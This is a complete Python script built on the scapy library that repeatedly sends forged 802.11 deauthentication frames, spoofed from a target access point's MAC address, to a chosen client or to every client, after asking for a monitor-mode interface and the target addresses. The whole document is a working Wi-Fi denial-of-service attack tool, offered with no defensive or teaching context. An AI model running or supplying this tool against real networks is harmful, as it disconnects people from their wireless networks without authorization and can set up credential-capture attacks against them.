from scapy.all import *
import time

def send_deauth_packets_loop(ap_mac, client_mac, iface, delay=0.1):
    dot11 = Dot11(
        type=0, subtype=12,
        addr1=client_mac,  # Client MAC
        addr2=ap_mac,      # AP MAC
        addr3=ap_mac
    )
    packet = RadioTap()/dot11/Dot11Deauth(reason=7)

    print(f"[+] Sending deauth packets continuously from {ap_mac} to {client_mac} via {iface}")
    try:
        while True:
            sendp(packet, iface=iface, verbose=0)
            time.sleep(delay)
    except KeyboardInterrupt:
        print("\n[+] Stopped by user.")

if __name__ == "__main__":
    iface = input("Monitor Mode Interface (e.g., wlan0mon): ").strip()
    ap_mac = input("Target AP MAC address (BSSID): ").strip()
    client_mac = input("Target Client MAC (or ff:ff:ff:ff:ff:ff for broadcast): ").strip()
    delay_input = input("Delay between packets in seconds (default 0.1): ").strip()
    delay = float(delay_input) if delay_input else 0.1

    send_deauth_packets_loop(ap_mac, client_mac, iface, delay)
